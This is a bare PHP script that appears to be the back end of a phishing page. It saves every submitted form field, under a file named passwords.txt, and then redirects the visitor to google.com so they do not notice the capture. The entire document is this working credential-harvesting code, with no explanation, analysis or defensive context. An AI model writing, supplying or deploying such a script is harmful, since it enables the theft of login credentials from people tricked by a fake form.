<?php
$file = fopen("passwords.txt", "w");
foreach ($_POST as $variable => $value) {
  fwrite($file, $variable . " = " . $value . "\n");
}
fclose($file);
header("Location: https://www.google.com"); // Redirects user to a real site
?>
